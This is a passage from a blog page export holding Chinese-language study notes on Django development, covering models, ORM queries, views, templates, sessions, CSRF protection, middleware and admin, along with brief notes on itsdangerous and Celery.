class=\"headerlink\" title=\"数据加密\"></a>数据加密</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install itsdangerous\nfrom itsdangerous import TimedJSONWebSignatureSerializer\n创建一个TimedJSONWebSignatureSerializer对象: xx &#x3D; TimedJSONWebSignatureSerializer(&#39;加密秘钥&#39;，过期时间)\n\n加密：加密结果 &#x3D; TimedJSONWebSignatureSerializer对象.dumps(数据)\n解密: 解密结果 &#x3D; TimedJSONWebSignatureSerializer对象.loads(加密结果)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"异步发邮件\"><a href=\"#异步发邮件\" class=\"headerlink\" title=\"异步发邮件\"></a>异步发邮件</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install celery\n项目中新建一个任务包，在这个包中使用celery（from celery import Celery）\n创建Celery的实例对象：xx &#x3D; Celery(&#39;名字&#39;，broker&#x3D;&#39;redis:&#x2F;&#x2F;127.0.0.1:6379&#x2F;1&#39;),broker代表中间人\n定义需要异步处理的函数，用@xx.task装饰\n在需要用到异步处理的应用中使用：\n    导入过来的函数.delay(参数)\n再将整个项目复制一份，进入复制的项目中的celery的包中：\n    import os\n    os.environ.setdefault(&#39;DJANGO_SETTINGS_MODULE&#39;, &#39;dalifresh.settings&#39;)\n    django.setup()\n然后再终端输入命令:celery -A 取好的名字 worker -l info来运行这个异步处理<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Django\"><a href=\"#Django\" class=\"headerlink\" title=\"Django\"></a>Django</h2><h3 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h3><p>django-admin startproject 项目名</p>\n<h3 id=\"创建应用\"><a href=\"#创建应用\" class=\"headerlink\" title=\"创建应用\"></a>创建应用</h3><p>python manage.py startapp 应用名</p>\n<h3 id=\"运行web服务器\"><a href=\"#运行web服务器\" class=\"headerlink\" title=\"运行web服务器\"></a>运行web服务器</h3><p>python manage.py runserver</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python3 <span class=\"token operator\">-</span>m http<span class=\"token punctuation\">.</span>server <span class=\"token punctuation\">[</span>port<span class=\"token punctuation\">]</span> <span class=\"token comment\"># 可以启动一个web服务，供局域网内用户下载文件</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"将固定的路径加入python可以搜索的目录\"><a href=\"#将固定的路径加入python可以搜索的目录\" class=\"headerlink\" title=\"将固定的路径加入python可以搜索的目录\"></a>将固定的路径加入python可以搜索的目录</h3><p>import sys</p>\n<p>sys.path.insert(位置（从0开始），要加入搜索的目录)</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python manage<span class=\"token punctuation\">.</span>py shell <span class=\"token comment\"># 进入django终端</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"ORM框架\"><a href=\"#ORM框架\" class=\"headerlink\" title=\"ORM框架\"></a>ORM框架</h3><ul>\n<li>   1、对象和数据库映射</li>\n<li>   2、根据设计的模型生成数据库中的表:    -  1、生长牵引文件:python manage.py makemigrations    - 2、执行牵引文件:python manage.py migrate</li>\n</ul>\n<h3 id=\"模型类\"><a href=\"#模型类\" class=\"headerlink\" title=\"模型类\"></a>模型类</h3><blockquote>\n<p>在models.py中编写模型类</p>\n</blockquote>\n<ul>\n<li> 1、生长迁移文件:python manage.py makemigrations    -    注意如果有ForeignKey的话一定要加上on_delete = models.CASCADE</li>\n<li>2、执行迁移文件:python manage.py migrate</li>\n</ul>\n<blockquote>\n<p>python manage.py shell</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">首先:导入定义好的模型类\n其次:实例化一个对象\n插入 :对象.属性名=值\n保存:对像.save()\n拿到数据:变量 = 类名.objects.get(条件)\n    变量.属性：直接查看\n    变量.属性=值  ——> 变量.save()  :修改\n    变量.delete():删除<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"后台管理（在admin-py中编写后台管理类）\"><a href=\"#后台管理（在admin-py中编写后台管理类）\" class=\"headerlink\" title=\"后台管理（在admin.py中编写后台管理类）\"></a>后台管理（在admin.py中编写后台管理类）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">本地化: LANGUAGE_CODE &#x3D; &#39;zh-hans&#39; :使用中文\n       TIME_ZONE &#x3D; &#39;Asia&#x2F;Shanghai&#39; :使用中国时间\n\n创建管理员:python manage.py createsuperuser   (第一次新建管理员的时候必须要执行一下牵引文件，可以不生成，但必须执行)\n\n自己创建的管理员是默认是放在数据库中的一个单独的表中的，但是可以使用（在settings.py中）：\n# django认证系统使用的模型类\nAUTH_USER_MODEL&#x3D;&#39;应用.类名&#39;\n\n这个来规定生成数据放在什么表，在实际开发中是特别的重要的，一般和用户信息放在一起\n\n使用这个必须导入(models.py中)from django.contrib.auth.models import AbstractUser\n\n加入自己定义的数据库或者数据库模型: 1、导入 2、admin.site.register(类)\n\n规定自定义的数据库或者数据库模型的显示: list_display(&#39;&#39;,&#39;&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"使用视图（在views中编写）\"><a href=\"#使用视图（在views中编写）\" class=\"headerlink\" title=\"使用视图（在views中编写）\"></a>使用视图（在views中编写）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">使用模块: from django.http import HttpResponse,HttpResponseRedirect(重定向)\n使用模块: from django.shortcuts import render,redirect(也是重定向)\n使用 return HttpResponse(&#39;返回值&#39;) 返回结果\n使用模块: from django.conf.urls import include, url\nurl的使用方法:url(r&#39;正则表达式&#39;,处理字符串)\n            url(r&#39;正则表达式&#39;,include(处理源))\n\n实现过程: views.py 中创建视图（使用模块第一个） ---&gt;  创建 urls.py (使用第二个模块,并且导入views.py)  ---&gt;  项目中的urls.py\n中添加创建的urls.py(使用url添加)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h3 id=\"模板（项目文件夹中创建-模板文件夹templates）\"><a href=\"#模板（项目文件夹中创建-模板文件夹templates）\" class=\"headerlink\" title=\"模板（项目文件夹中创建 模板文件夹templates）\"></a>模板（项目文件夹中创建 模板文件夹templates）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在项目文件夹中的setting中设置TEMPLATES中的DIRS，表示模板位置，一般拼接\n使用模板:\n    导入模块:from django.template import loader\n    1、使用模板文件: temp &#x3D; loader.get_template(&#39;文件名可以带路径&#39;)\n    2、定义上下文（个模板传参数）: context &#x3D; &#123;字典参数&#125;\n    3、渲染模板:产生HTML代码:res_html &#x3D; temp.render(context)\n    4、返回浏览器:return HttpResponse(res_html)\n\n最简单的使用方法: return render(request,&#39;文件可以带路径&#39;,&#123;传参数&#125;)\n\n参数在html代码中的使用方法:\n    普通变量:&#123;&#123;key&#125;&#125;\n    for循环:&#123;% fro x in xx %&#125;\n            &#123;%endfor%&#125;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"关于django和数据库的操作\"><a href=\"#关于django和数据库的操作\" class=\"headerlink\" title=\"关于django和数据库的操作\"></a>关于django和数据库的操作</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、创models文件 class xxx(models.Model)\n2、迁移文件\n3、创建views文件 def xxx(request)，必须有返回值,一般返回值用HttpResponse,使用模板的返回值用render,需要重定向的话使用redirect\n4、新建应用urls.py文件,用于定义访问时用的url地址\n5、取项目中的urls文件中添加应用的url文件 ：url(r&#39;^&#39;,include(xxx.urls))\n6、在项目中创建templates模板文件,在到seting中配置一下，templates中的文件就是html文档<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h3 id=\"第一大点-models-模型-注册模型类\"><a href=\"#第一大点-models-模型-注册模型类\" class=\"headerlink\" title=\"第一大点:models,模型,注册模型类\"></a>第一大点:models,模型,注册模型类</h3><p>django操作数据库的相关知识</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">应用下的models.py文件中定义的所有模型，都要继承一个抽象基类:\n创建抽象基类:在项目中创建一个pythonPakage,名字叫db,在这个包下面创建一个base_model.py文件，在文件中编写一个抽像基类<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> django<span class=\"token punctuation\">.</span>db <span class=\"token keyword\">import</span> models\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">BaseModel</span><span class=\"token punctuation\">(</span>models<span class=\"token punctuation\">.</span>Model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token triple-quoted-string string\">'''模型抽象基类'''</span>\n        create_time <span class=\"token operator\">=</span> models<span class=\"token punctuation\">.</span>DateTimeField<span class=\"token punctuation\">(</span>auto_now_add<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> verbose_name<span class=\"token operator\">=</span><span class=\"token string\">'创建时间'</span><span class=\"token punctuation\">)</span>\n    update_time <span class=\"token operator\">=</span> models<span class=\"token punctuation\">.</span>DateTimeField<span class=\"token punctuation\">(</span>auto_now<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> verbose_name<span class=\"token operator\">=</span><span class=\"token string\">'更新时间'</span><span class=\"token punctuation\">)</span>\n        is_delete <span class=\"token operator\">=</span> models<span class=\"token punctuation\">.</span>BooleanField<span class=\"token punctuation\">(</span>default<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> verbose_name<span class=\"token operator\">=</span><span class=\"token string\">'删除标记'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">Meta</span><span class=\"token punctuation\">:</span>\n        <span class=\"token triple-quoted-string string\">'''说明是一个抽象模型类'''</span>\n        abstract <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"约束选项在字段类型中使用，字段类型在models模块下使用\"><a href=\"#约束选项在字段类型中使用，字段类型在models模块下使用\" class=\"headerlink\" title=\"约束选项在字段类型中使用，字段类型在models模块下使用\"></a>约束选项在字段类型中使用，字段类型在models模块下使用</h5><p>字段类型:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1、AutoField:自动编号\n2、BooleanField:布尔类型\n3、NullBooleanField:Null，True，False三种值\n4、CharField（max_length&#x3D;）:字符串,必须指定max_length\n5、TextField:大文本类型\n6、IntegerField:整数\n7、DecimalField(max_digits&#x3D;,decimal_places&#x3D;):浮点数，第一个参数表示总位数，第二个参数表示小数位数\n8、FloatField(max_digits&#x3D;,decimal_places&#x3D;):浮点数，参数同上\n9、DateField（[auto_now&#x3D;,auto_now_add&#x3D;]）:日期类型，有两个可选参数，用的时候只能用一个，第一个表示更新时间，第二个表示第一次创建的的时间\n10、TimeField（[auto_now&#x3D;,auto_now_add&#x3D;]）:时分秒\n11、DateTimeField（[auto_now&#x3D;,auto_now_add&#x3D;]）:年月日时分秒\n12、FileField:文件上传\n13、ImageField:有效图片\n\n14、ForeignKey:一对多\n15、ManyToManyField:多对多\n16、OneToOneField:一对一\n\n约束选项:\n1、default:默认值\n2、primary_key:主键\n3、unique:不重复\n4、db_index:索引，db_index&#x3D;True&#x2F;False\n5、db_column:指定表字段的名字，db_column&#x3D;&#39;名字&#39;\n6、null:空\n7、blank:是否为空，在后台使用，默认True，在django管理页面有用\n8、chioces：chioces选项,等于一个元组，格式 choices &#x3D; ((xx,xxx),(xx,xxx)……),网页显示为一个列表框\n9、verbose_name：制定在后台的显示名称 ，字段和表名都可以用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"富文本\"><a href=\"#富文本\" class=\"headerlink\" title=\"富文本\"></a>富文本</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">django使用tinymce：\n    pip install django-tinymce\n    from tinymce.models import HTMLField\n    xx &#x3D; HTMLField(verbose_name &#x3D; &#39;xx&#39;)\n    在settings.py中注册这个富文本编辑器，INSTALLED_APPS中添加tinymce\n    在settings.py中设置富文本编辑器的属性：\n        TINYMCE_DEFAULT_CONFIG &#x3D; &#123;\n            &#39;theme&#39;: &#39;advanced&#39;,\n            &#39;width&#39;: 编辑器的宽,\n            &#39;height&#39;: 编辑器的高,\n        &#125;\n    在项目urls中添加: url(r&#39;^tinymce&#x2F;&#39;, include(&#39;tinymce.urls&#39;))\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"查询\"><a href=\"#查询\" class=\"headerlink\" title=\"查询\"></a>查询</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">说明一下:exclude,filter,get三个都时带条件的---&gt;模型名.objects.查询方式(属性名__条件名&#x3D;值)\n条件名:\nexact:判等 ，可以不用直接用 &#x3D;\ncontains:模糊查询，包含\nendswith\\startswith:模糊查询，结尾\\开头\nisnull:空查询,布尔值\nin:范围查询，属性名__in &#x3D; 列表或者元组\ngt,lt,gte,lte:大于，小于，大于等于，小于等于\nday&#x2F;month&#x2F;year:使用方法:日期查询\n\nget():返回满足条件的一条记录\nall():返回所有记录，查询集\nfilter():返回满足条件的所有记录，查询集\nexclude():返回不满足条件的所有记录，查询集\norder_by(‘属性名1’,’属性名2&#39;……):升序\norder_by(‘-属性名1’,’-属性名2&#39;……):降序，order_by()是将查出来的数据进行排序，如：BookInfo.objects.all().order_by(&#39;id&#39;,&#39;-btitle&#39;)\n\n\nQ对象:用于查询时候的多个条件的  ’与或非‘  表示\n    from django.db.models import Q\n    例子:\n        BookInfo.object.filter(Q(id &#x3D; 2) &amp; Q(btitle &#x3D; &#39;hello&#39;))   与\n        BookInfo.object.filter(Q(id &#x3D; 2) | Q(btitle &#x3D; &#39;hello&#39;))   或\n        BookInfo.object.filter(~Q(id &#x3D; 2))                        非\nF对象:条件中用于属性比较,还可以进行算数运算\n    from django.db.models import F\n    例子:\n        BookInfo.objects.filter(id__gt &#x3D; F(&#39;bid&#39;))\n        BookInfo.objects.filter(id__gt &#x3D; F(&#39;bid&#39;)*3)\n\n\n\n聚合函数:sum,count,avg,max,min,在django中通过aggregates来使用\n    from django.db.models import Sum,Count,Avg,Max,Min\n    例子:\n        BookInfo.objects.all().aggregate(Count(&#39;id&#39;)) : 返回值是字典\n        BookInfo.objects.all().aggregate(Sum(&#39;bread&#39;) : 总和\n\n\n插入、更新、删除:\n    save():插入更新\n    delete():删除\n\n关联查询:\n    一对多:对象.多类的名字__set.all()\n    多对一:对象.关系属性\n\n\n模型管理器:\n    也是在models中编写，\n    格式:\n        class xxx (models.Manager):\n            可以定义方法或者定义查询（all）\n\n\n元选项(指定表名):\n    class Meta:\n        db_table &#x3D; &#39;xxx&#39;\n    verbose_name &#x3D; &#39;xxx&#39;\n    verbose_name_plural &#x3D; verbose_name\n    每个需要自定义表名的模型下方都要写这个代码，否则用系统给的表明,后两行代码代表指定在后台显示什么名字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n<h2 id=\"第二大点-views-视图的使用\"><a href=\"#第二大点-views-视图的使用\" class=\"headerlink\" title=\"第二大点:views,视图的使用\"></a>第二大点:views,视图的使用</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、项目中的urls中加入应用中的urls中的所有，表示项目启动以后可以使用应用的链接配置\n2、应用中的urls用于配置浏览器页面输入的地址，一般只配置‘&#x2F;’以后的\n3、编写views文件，写清楚每个url的动作，定义在函数中,需要返回值\n\n4、views文件中所写的代码就是写应该在网页中现实的东西\n5、如果要使用模板，需要在项目文件夹下创建一个templates文件夹，并且配置好路径\n\n6、return HttpResponse(xx),不用模板\n   return HttpResponseRedirect(地址),redirect(地址)，两个功能一样都是重定向，在数据库添加后及时显示时候用\n   return render(request, &#39;模板文件位置&#39;,&#123;参数&#125;)\n\n重点:关于数据库的操作:导入 models  (类)\n    关于网页内容操作:导入 views   (函数)\n\nseting 中的设置，要改一起改\n    setting 中的DEBUG属性(调试模式):默认是True，改成False后可以显示标准的报错页面\n    setting 中的ALLOWED_HOSTS属性(允许访问):默认注释了的，是一个列表，ALLOWED_HOSTS &#x3D; [&#39;*&#39;]表示所有用户都可访问\n\n给视图传参数: 在urls中配置url的时候，给一个正则的分组就表示给视图传参数:\n            第一种:直接分组:views中的形参可以随便定义 :url(r&#39;^index(\\d+)$&#39;,views.show)--&gt;def show(request,a)\n            第二种:分组命名:views长的形参必须和分组的名字一致  :url(r&#39;^index(?p&lt;num&gt;\\d+)$&#39;,views.show)--&gt;def show(request,num)\nrequest参数:\n    def index (request)中使用,躲在用于登陆的时候使用\n        request.POST:保存的是网页中用post方式提交的参数，参数保存在请求头中\n        request.GET:保存的是网页中用get方式提交的参数，参数保存在url中\n    使用方法:\n        xx &#x3D; request.POST.get(&#39;xxx&#39;)\n        xx &#x3D; request.GET.get(&#39;xxx&#39;)\n\n\n 重点:\n    如果是网页模板，那么需要创建一个templates文件夹在项目文件夹下并且setting中配置路径，上面也提到过\n    如果是静态的文件，js，css，image这些文件的话，需要在项目文件夹下创建一个static文件夹，平且在setting中配置STATIC_URL &#x3D; &#39;&#x2F;static&#x2F;&#39; 和 STATICFILES_DIR &#x3D; [os.path.join(BASE_DIR,&#39;刚刚创建的文件夹static&#39;)]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Cookie（多用于记住用户名）\"><a href=\"#Cookie（多用于记住用户名）\" class=\"headerlink\" title=\"Cookie（多用于记住用户名）\"></a>Cookie（多用于记住用户名）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie的设置:需要一个HttpResponse的对象或者他的子类的对象，set_cookie\n取出cookie:request对象的COOKIES中\n\n设置:\n    xxx  &#x3D;  HttpResponse() 实例化HttpResponse的对象\n    xxx.set_cookie(&#39;key&#39;,value,max_age &#x3D; x) max_age是这只cookie的生存周期的，单位为秒\n    xxx.set_cookie(&#39;key2&#39;,value2,max_age &#x3D; x)\n    return xxx\n取出:\n    xxx &#x3D; request.COOKIES[&#39;key&#39;]\n    return HttpResponse(xxx)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"session-多用于银行卡-登录状态\"><a href=\"#session-多用于银行卡-登录状态\" class=\"headerlink\" title=\"session(多用于银行卡,登录状态)\"></a>session(多用于银行卡,登录状态)</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">session是一个特殊的Cookie,他的安全性更高，只给浏览器一个cookie编号,更重要的是，session可以记住用户的登录状态\n\n读取设置都在request\n设置session:\n    request.session[&#39;key&#39;] &#x3D; value\n    request.session[&#39;key2&#39;] &#x3D; value2\n    request.set_expiry(xx) 设置存活时间，整数，秒\n    return HttpResponse(request)\n\n获取:\n    xxx &#x3D; request.session[&#39;xx&#39;]\n    xxx &#x3D; request.session[&#39;xx&#39;]\n    xxx &#x3D; request.session.get(&#39;xx&#39;)\n    return HttpResponse(xx)\n登录状态:\n    判断有没有这个键:request.session.has_key[&#39;&#39;]\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h2 id=\"第三块-模板templates\"><a href=\"#第三块-模板templates\" class=\"headerlink\" title=\"第三块:模板templates\"></a>第三块:模板templates</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">html里面的模板标签:\n    &#96;&#123;&#123;变量&#125;&#125;&#96;\n    &#96;&#123;% xx %&#125;&#96;  &#96; &#123;% endxx %&#125;&#96;\n    &#123;# 注释内容 #&#125;\n   &#96; &#123;% comment %&#125;&#96; 多行注释 &#96;&#123;% endcomment %&#125;&#96;\n\n过滤器:\n    格式: 模板变量 | 过滤器:参数\n    date:改变日期的显示格式\n    length:求字符串和列表的长度\n    default:设置不符合要求时候的默认值\n\n自定义过滤器:\n    在应用下创建一个templatetags包\n    在templatetags中创建过滤器xxx.py\n    在xxx.py中导入 from django.template import Library\n    实例化Library对象，xx &#x3D; Library()\n    定义一个函数，和python一样的，有返回值的\n    装饰一下，@xx.xxx\n\n    在html中加载，在最前面:&#96;&#123;% load xxx %&#125;&#96;\n    使用过滤器:变量 | xx\n    如果xx函数中有参数，竖线前面的变量就是参数，如果有两个以上的参数那么只用传n-1个参数\n\n模板继承:\n    被继承的html模板不动，在子html模板中删除html代码，只写一句&#96;&#123;% extends &#39;父模板地址&#39; %&#125;&#96; 地址相对于templates\n\n    在父模板中预留位置:子模板就可以重写父模板中预留的位置，从而保证有些不同 在父模板中&#96;&#123;% block 块名 %&#125;&#96; 可以写可以不写 &#96;&#123;% endblock 块名 %&#125;&#96;，子模板中也写&#96;&#123;% block 块名 %&#125; &#96;可以写可以不写 &#96;&#123;% endblock 块名 %&#125;&#96;，两边的两个标签需要一样块名一样，内容可以不一样\n    既要使用父模板中的预留内容，也要自定义预留内容:&#96;&#123;% block 块名 %&#125;&#96; &#96;&#123;&#123; block.super &#125;&#125;&#96;可以写可以不写 &#96;&#123;% endblock 块名 %&#125;&#96;\n\n    html转义:\n        在views.py 中render(request,&#39;html 路径&#39;, &#123;&#39;content&#39;:&#39;&lt;h1&gt;hello&lt;&#x2F;h1&gt;&#39;&#125;)\n        这样传过去的用的时候&#123;&#123;content&#125;&#125;，html并不会把传过来的&lt;h1&gt;当作标签，而是转义成了字符\n        解决方法:\n            &#123;&#123; content | safe &#125;&#125;\n\ncsrf伪造攻击:\n    主要原因:\n        1、你在正常登录网站之后，浏览器保存了你的sessionid,而且你并没有退出\n        2、在没有退出的情况下，访问了其他的网站做了一些不好的操作，间接的修改你的密码\n    django默认启用了csrf防护，并且只针对post提交的数据防护，并且对包括自己的所有人防护\n    解决办法:\n        在html文件中有post提交的表单下方第一行输入&#96;&#123;% csrf_token %&#125;&#96;这样自己就可以正常使用了\n\n验证码(防止暴力请求):\n    用闭包的方式验证登录，有些界面只有登陆了才能使用\n    工作的时候网上取down\n\n\nurl 反向解析(给地址取个名字,然后直接用地址就可以动态的生成网页地址，不管网页地址怎么变化):\n    在项目中的urls中的链接应用url地址的地方添加第三个参数:url(r&#39;^&#39;, include(&#39;应用文件夹.urls&#39;), namespace&#x3D;&#39;应用文件夹名字&#39;)  ,namespace&#x3D;&#39;一般用应用名,也可以自定义&#39;\n    然后给应用中urls中的每一个自定义的链接取名:url(r&#39;^xxx$&#39;,views.xx, name &#x3D; &#39;取名&#39;)\n\n    在html中使用:\n        1、&lt;a href &#x3D;&#96; &#123;% url &#39;namespace:name&#39; %&#125;&#96;  url地址中没有参数  url(r&#39;^xx$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        2、&lt;a href &#x3D;&#96; &#123;% url &#39;namespace:name&#39; 1%&#125;&#96;  url地址中有一个参数   url(r&#39;^xx&#x2F;(\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        3、&lt;a href &#x3D; &#96;&#123;% url &#39;namespace:name&#39; 1 3%&#125; &#96; url地址中有两个参数   url(r&#39;^xx&#x2F;(\\d+)&#x2F;(\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        *4、&lt;a href &#x3D; &#96;&#123;% url &#39;namespace:name&#39; a&#x3D;1 b&#x3D;3%&#125;&#96;  url地址中有两个被取名的参数   url(r&#39;^xx&#x2F;(?P&lt;a&gt;\\d+)&#x2F;(?P&lt;b&gt;\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n    在views中使用:\n        from django.core.urlresolvers import reverse\n        1、reverse(&#39;namespace:name&#39;) url地址中没有参数  url(r&#39;^xx$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        2、reverse(&#39;namespace:name&#39;, args &#x3D; (1)) url地址中有一个参数   url(r&#39;^xx&#x2F;(\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        3、reverse(&#39;namespace:name&#39;, args &#x3D; (1,3) url地址中有两个参数   url(r&#39;^xx&#x2F;(\\d+)&#x2F;(\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)\n        *4、reverse(&#39;namespace:name&#39;, kwargs &#x3D; &#123;&#39;a&#39;:1, &#39;b&#39;:2&#125;) url地址中有两个被取名的参数   url(r&#39;^xx&#x2F;(?P&lt;a&gt;\\d+)&#x2F;(?P&lt;b&gt;\\d+)$&#39;, views.xx, name &#x3D; &#39;name&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"静态文件-css-js-image\"><a href=\"#静态文件-css-js-image\" class=\"headerlink\" title=\"静态文件(css\\js\\image)\"></a>静态文件(css\\js\\image)</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在项目文件夹中创建static文件夹\n在setting中配置:\n    STATIC_URL &#x3D; &#39;&#x2F;定义网址以什么开头&#x2F;&#39;  一般都是static\n        这里的名字如果想要随便改，然后在html中动态生成的话，在html中加载 &#96;&#123;% load staticfiles %&#125; &#96; 在要使用的地方用&#96;&#123;% static &#39;文件路径&#39; %&#125;&#96;这样进行拼接\n    STATICFILES_DIR &#x3D; [拼接文件夹位置]\n静态文件的使用实在html中的链接<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"中间件\"><a href=\"#中间件\" class=\"headerlink\" title=\"中间件\"></a>中间件</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、获取浏览器端的ip地址: request.META[&#39;REMOTE_ADDR&#39;],可以设置某些ip访问网站\n2、中间件的左右就是在每一个视图函数调用之前都会先执行中间件，可以判断某些用户或者界面不能使用，如判断是否登录，判断ip是否被禁止\n3、定义中间件的方法:\n    在应用中新建一个middleware.py 的python文件\n    中间件的构成:\n        class xxxx(object):   中间件类\n            xxx\n            def process_view(self, request, view_func, *view_args, **view_kwargs)  中间件函数\n                xxx\n                return xxx\n4、定义了中间件以后，我们需要在setting中注册：找到MIDDLEWARE_CLASSES，然后&#39;应用名.middleware.中间类\n5、中间件函数是内置的，只能使用内置的那么几个:\n    process_view(self, request, view_func, *view_args, **view_kwargs) : url匹配之后，视图调用之前\n    process_request(self, request) : 产生request对象之后， url匹配之前调用\n    __init__(self) : 服务器响应第一个请求的时候调用\n    process_response(self, request, response) : 视图调用之后，内容返回浏览器之前,需要return response\n    process_exception(self, request, exception) : 视图函数出现异常的时候调用，如果有多个exception，则按照注册的从后往前执行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"第四模块Admin后台管理\"><a href=\"#第四模块Admin后台管理\" class=\"headerlink\" title=\"第四模块Admin后台管理\"></a>第四模块Admin后台管理</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、创建用户:python manage.py createsuperuser\n2、登录用户:网址&#x2F;admin\n3、注册模型类:在models.py中定义模型（将数据库中的数据加载到后台管理页面），在admin.py中去注册这个模型，admin.site.register(模型名字)\n\n\n上传图片:\n    